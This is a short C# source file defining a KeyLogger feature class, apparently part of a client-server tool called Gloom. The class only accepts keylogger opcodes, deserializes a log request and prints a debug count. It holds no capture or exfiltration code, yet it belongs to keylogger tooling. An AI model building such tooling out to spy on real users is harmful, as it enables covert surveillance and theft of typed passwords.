namespace Gloom.Client.Features.Logger
{
	internal class KeyLogger : FeatureBase
	{
		private bool active = true;

		public override Guid[] AcceptedOps => new Guid[] { OpCodes.KeyLoggerSettingRequest, OpCodes.KeyLogRequest };

		public KeyLogger(IMessageSender sender) : base(sender)
		{
		}

		public override async Task HandleAsync(Guid op, byte[] data)
		{
			if (op != OpCodes.KeyLogRequest)
				return;
			var req = data.Deserialize<OpStructs.KeyLogRequest>();
#if DEBUG
			Console.WriteLine("KeyLogger log receive. count=" + req.LogCount);
#endif
		}
	}
}